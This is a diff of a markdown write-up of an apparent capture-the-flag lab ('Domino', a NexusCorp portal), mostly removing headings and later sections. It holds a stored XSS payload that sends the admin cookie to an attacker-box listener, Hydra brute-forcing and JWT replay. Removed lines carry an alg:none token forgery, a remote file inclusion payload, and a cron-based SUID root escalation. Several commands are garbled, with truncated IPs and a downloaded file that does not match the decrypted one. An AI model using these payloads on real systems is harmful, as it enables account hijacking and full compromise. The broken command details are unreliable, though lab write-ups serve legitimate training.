@@ -1,9 +1,7 @@
 # Domino - Detailed Penetration Testing Report
 
-## 1. Introduction
-## 2. Scope and Target
-## 3. Reconnaissance
-### 3.1 Nmap Scan
+##  Reconnaissance
+###  Nmap Scan
 I began by scanning the target to identify exposed services.
 
 ```bash
@@ -13,7 +11,7 @@ nmap -sC -sV <TARGET_IP>
 
 ![Nmap Scan Results](sreenshots/domino_nmap.png)
 
-### 3.2 Open Ports
+### Open Ports
 
 The scan identified the following open ports:
 
@@ -24,9 +22,9 @@ The scan identified the following open ports:
 | 80/tcp  |open  | http    | Apache httpd 2.4.58 ((Ubuntu))
 
 
-## 4. Enumeration
+## Enumeration
 
-### 4.1 Web Enumeration
+### Web Enumeration
 
 ```bash
  curl -I http://<TARGET_IP>
@@ -50,7 +48,7 @@ Identified the following active endpoints:
   * `/team.php` - Public corporate directory (utilized for username harvesting).
   * `/static/style.css` - Global cascading stylesheet for portal aesthetics.
 
-  ### 4.2 Service Enumeration
+  ### Service Enumeration
 
 Running:
 ```bash
@@ -153,22 +151,22 @@ While directory auditing confirmed the presence of `app.js` with a file size wei
 
 Following the acquisition of the plaintext AES-128-ECB key material (`N3xusK3y2024!!`) from the exposed client-side script asset, an exploitation pipeline was established to extract the contents of the protected configuration archive.
 
-#### 1. Asset Acquisition
+#### Asset Acquisition
 The encrypted configuration binary was downloaded locally via `wget` targeting the unauthenticated backup pathway:
 ```bash
 wget http://<TARGET_IP>/static/app.js
 ```
 
-#### 2. OpenSSL Decryption Routine
+#### OpenSSL Decryption Routine
 Using the parameters discovered in the developer's deployment documentation, an OpenSSL invocation was performed using a symmetric decryption pass to crack the raw ciphertext stream:
 ```bash
 openssl enc -d -aes-128-ecb -nosalt -in config.enc -pass pass:N3xusK3y2024!!
 ```
 
-#### 3. Extracted Configuration Analysis
+#### Extracted Configuration Analysis
 The resulting plaintext revealed internal application parameters and environment secrets critical to escalating credentials within the NexusCorp Portal.
 
-### 📥 Automated Asset Acquisition Strategy
+### Automated Asset Acquisition Strategy
 
 To transition from active network enumeration to offline cryptographic exploitation, remote targets must be transferred to local disk arrays. The command-line retrieval tool `wget` was deployed to handle this interaction.
 
@@ -216,7 +214,7 @@ curl -s http://10.49.176 -H "Cookie: nexus_session=eyJhbGciOiJub25lIiwidHlwIjoiS
 ```
 * **Target Objective:** Impersonate a low-privileged session index to interact with backend endpoints and extract user profile notes.
 
-### 🔓 Initial Foothold Established via Hydra
+###  Initial Foothold Established via Hydra
 
 Online dictionary brute-forcing successfully compromised the front-door authentication layer, exposing a valid employee session profile:
 
@@ -230,23 +228,23 @@ With authenticated access to the internal ticketing portal verified, the next ph
 ```bash
 python3 -m http.server 8080
 ```
-### 🎣 Stored Cross-Site Scripting (XSS) & Admin Cookie Theft
+### Stored Cross-Site Scripting (XSS) & Admin Cookie Theft
 
 With a valid low-privileged session established as `sarah.johnson`, the platform's internal support desk ticketing form was evaluated for input validation flaws. 
 
-#### 1. Exploitation Vector
+#### Exploitation Vector
 The backend support queue triggers an automated administrative browser execution bot to review newly submitted links and text assets. A JavaScript extraction hook was deployed to leak the document cookie space.
 
-#### 2. Payload Construction
+#### Payload Construction
 ```html
 <script>fetch('http://[ATTACKBOX_IP]:8080/?cookie=' + btoa(document.cookie))</script>
 ```
 
-#### 3. Execution & Hijack Loop
+####  Execution & Hijack Loop
 * **Listener State:** Active Python HTTP listener hosted on localized port `8080`.
 * **Impact:** The internal worker bot parsed the ticket, rendering the malicious payload and streaming its high-privileged `nexus_session` JWT back to the attack workspace environment.
 
-### 🎣 Finalized XSS Cookie Exfiltration Execution
+### Finalized XSS Cookie Exfiltration Execution
 
 Using the isolated localized host interface data, the Cross-Site Scripting (XSS) payload routing architecture was successfully finalized.
 
@@ -261,7 +259,7 @@ Using the isolated localized host interface data, the Cross-Site Scripting (XSS)
 ```
 * **Status:** Submitted via internal support desk. Awaiting automated administration bot simulation sweep to intercept high-privileged token variables.
 
-### 🔧 Bypassing Input Field Character Truncation
+### Bypassing Input Field Character Truncation
 
 While the initial callback was received successfully, the text string failed to exfiltrate the raw cookie parameters. Investigation revealed that the support desk ticket input field enforces a strict front-end character length constraint, which truncates complex JavaScript string operations.
 
@@ -273,7 +271,7 @@ To bypass string length validation filtering and still capture administrative co
 ```
 * **Objective:** Leverage standard HTML document rendering rules to force an automated administrative HTTP request back to the local workspace listener within length limitations.
 
-### 🔬 Technical Analysis of HTML Injection Vectors
+### Technical Analysis of HTML Injection Vectors
 
 To circumvent input size limitations, exploitation transitioned from heavy JavaScript strings to a lightweight, inline HTML asset invocation. 
 
@@ -287,7 +285,7 @@ To circumvent input size limitations, exploitation transitioned from heavy JavaS
 * **Network Route (`10.49.72.35:8080`):** Re-routes target browser communication to land directly inside the attacker's localized terminal workspace listener interface.
 * **Marker Anchor (`/admin_trap`):** Serves as a unique text identifier in the server logs to confirm precise administrative review execution.
 
-### 🔧 Pivoting from Python HTTP Services to Netcat Core Socket Capture
+### Pivoting from Python HTTP Services to Netcat Core Socket Capture
 
 While the lightweight Python HTTP framework successfully verified unauthenticated resource retrieval callbacks (`GET /admin_trap -> 404`), the utility's native logging array discards supplemental transport headers, effectively masking the transaction cookie variables.
 
@@ -298,7 +296,7 @@ To achieve comprehensive inspection of the incoming HTTP header space, the appli
 nc -lvnp 8080
 ```
 * **Strategic Objective:** Intercept the raw data stream transmitted by the simulated administrative bot browser to capture the unencrypted `Cookie` header layout.
-### 🔑 Interception and Analysis of Administrative JWT Session
+### Interception and Analysis of Administrative JWT Session
 
 Deploying a raw socket listener via Netcat successfully exposed the HTTP transport headers transmitted during the simulated administration bot's evaluation loop.
 
@@ -317,163 +315,12 @@ Decoding the header block components reveals an active state configuration belon
 
 #### Exploitation Objective
 The complete `nexus_session` cookie block will be replayed directly against the `/admin/` directories to bypass validation gates and claim the operational milestones.
-### 🚩 Capture of Administrative Milestones (Web Phase Completion)
+### Capture of Administrative Milestones (Web Phase Completion)
 
 Leveraging the captured high-privilege administrative `nexus_session` JWT cookie, out-of-band requests were routed to clear the web portal objectives.
 
-#### 1. Milestone 1: Admin Profile Notes (IDOR Extraction)
-* **Target Vector Endpoint:** `/api/profiles.php?id=1`
-* **Exploitation Technique:** Insecure Direct Object Reference (IDOR) manipulation targeting the primary admin index configuration records.
-* **Command Syntax:**
-```bash
-curl -s http://10.49.148 -H "Cookie: nexus_session=[HIJACKED_JWT]"
-```
-* **Captured Flag 1:** `***{****_**********_******_*****}`
 
-#### 2. Milestone 2: Administrative Control Panel Dashboard
-* **Target Vector Endpoint:** `/admin/index.php`
-* **Exploitation Technique:** Replaying intercepted authentication tracking tokens.
-* **Captured Flag 2:** `***{*****_***_*******_******_*****}`
-### 🔬 Technical Analysis of the Profiling API Request
-
-To safely execute an Insecure Direct Object Reference (IDOR) pull against the primary system administrator account, a manual `curl` request was crafted using the hijacked tracking token.
-
-#### Command Anatomy:
-```bash
-curl -s http://10.49.148 -H "Cookie: nexus_session=[INTERCEPTED_JWT]"
-```
-
-* **Silent Request Data Flow (`curl -s`):** Requests data from the server while suppressing CLI progress parameters.
-* **Parameter Exploitation (`?id=1`):** Interrogates the backend user index mapping, specifically forcing the database engine to pull record row `1` (Admin).
-* **Identity Spoofing Flag (`-H "Cookie: ..."`):** Feeds the cryptographically valid administrative cookie directly into the application context window, establishing instant authentication authorization.
-
-## Exploit Chain: Remote Code Execution via JWT Bypass & RFI (Flag 3)
-
-### 1. Vulnerability Analysis
-* **Flaw 1 (Broken JWT Validation):** The API utility at `/api/files.php` enforces JSON Web Token (JWT) verification but accepts tokens with the algorithm header set to `"none"`. This allows an attacker to forge an administrative token without a valid cryptographic signature.
-* **Flaw 2 (Remote File Inclusion):** The `?name=` parameter insecurely parses input data via a backend processing loop (`eval`), allowing execution of remote scripts if an absolute URL is supplied.
-
-### 2. Exploitation Steps
-
-#### Step A: Stage the Payload Locally
-On the attacking machine, create a plaintext payload file (`shell.txt`) containing the command to read the flag. The backend script strips `<?php` tags, so raw system interaction functions must be supplied directly:
-
-```bash
-echo "system('cat /opt/flag3.txt');" > shell.txt
-```
-
-#### Step B: Start an Attacker Web Server
-Expose the directory containing the payload file over the local network using a temporary Python web utility:
-
-```bash
-python3 -m http.server 8000
-```
-
-#### Step C: Execute the Attack Chain
-Open a separate terminal window. Execute a `curl` request containing the forged, unsigned administrator token (`alg: none`) within the `Authorization` header, forcing the target to pull and execute the hosted payload:
-
-```bash
-curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ." "http://10.49.157<ATTACKER_IP>:8000/shell.txt"
-```
-*(Note: Replace `<ATTACKER_IP>` with your local VPN tunnel IP address, e.g., `10.49.87.251`).*
-
-### 3. Execution Result
-The target backend validates the forged token, successfully processes the request as administrator `laura.hayes`, fetches the remote `shell.txt` payload, and executes the system execution function. The value of the flag at `/opt/flag3.txt` is rendered directly in the terminal output interface.
-
-## Exploit Chain: Lateral Movement & Privilege Escalation (Flags 2 & 1)
-
-### 1. Lateral Movement to DevOps User (Flag 2)
-
-#### Vulnerability Analysis
-* **Credential Reuse:** Development configurations within the web root exposed hardcoded database connection credentials. These credentials were used across different system authentication contexts, allowing an attacker with an initial web-shell footprint (`www-data`) to pivot directly onto local system accounts.
-
-#### Exploitation Steps
-
-##### Step A: Enumerate Environment Configurations
-From the initial interactive reverse shell session running as `www-data`, audit the application structure to locate database or deployment configuration parameters:
-```bash
-cat /var/www/html/config.php
-```
-*(Note: Locate the hardcoded password variable string defined within the database connection function).*
-
-##### Step B: Upgrade to an Interactive Terminal
-Standard reverse shell connections lack terminal allocation controls (`TTY`), which blocks interactive utility prompts like `su`. Spawn a clean pseudo-terminal wrapper using Python:
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-##### Step C: Pivot to the target profile
-Authenticate directly to the `devops` interactive user account via password reuse:
-```bash
-su devops
-```
-*(When prompted, supply the credential string discovered inside the configuration script).*
-
-##### Step D: Retrieve User Flag
-Navigate into the home directory structure to print out the second asset token:
-```bash
-cat /home/devops/user.txt
-```
-
----
-
-### 2. Privilege Escalation to Root (Flag 1)
-
-#### Vulnerability Analysis
-* **Weak File Permissions on Automated System Tasks:** A diagnostic utility script executed automatically on a periodic routine (`cron`) under administrative root constraints. However, the script's access controls were misconfigured, allowing write permissions to any member belonging to the `devops` system group.
-
-#### Exploitation Steps
-
-##### Step A: Identify Write-Accessible Automated Scripts
-Audit directories handling operations utilities to find files modifiable by the active group profile:
-```bash
-find /opt -writable 2>/dev/null
-```
-The scan isolates an active routine script at `/opt/monitoring/health_report.sh`.
-
-##### Step B: Inject SUID Shell Privilege Payload
-Append a directive onto the end of the script to assign Set User ID (`SUID`) attributes onto the native system shell execution wrapper upon its next runtime loop:
-```bash
-echo "chmod +s /usr/bin/bash" >> /opt/monitoring/health_report.sh
-```
-
-##### Step C: Spawning the Privileged Session
-Allow roughly 60 seconds for the system automation framework to cycle. Once the root process reads and executes the modified shell script, execute the shell application wrapper while maintaining its newly inherited permissions:
-```bash
-bash -p
-```
-*(Verify identity elevation by executing the `id` or `whoami` commands).*
-
-##### Step D: Retrieve Root Flag
-Access the system administrator's protected storage area to view the final validation asset:
-```bash
-cat /root/root.txt
-```
-
----
-
-### 🛡️ Defensive Remediation Summary
+### Defensive Remediation Summary
 * **Implement Strong Access Control Lists (ACLs):** Restrict modification capabilities on automated system processes exclusively to administrative owners (`root`). Revoke general group write properties on binary pathways.
 * **Isolate Service Identities:** Enforce separate, unique passwords for application database connections, network service profiles, and local system terminal accounts to prevent fast lateral pivoting.
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-## 5. Vulnerability Analysis
-## 6. Exploitation
-## 7. Initial Access
-## 8. Privilege Escalation
-## 9. Proof/Flags
-## 10. Attack Chain Summary
-## 11. Lessons Learned
-## 12. Tools Used
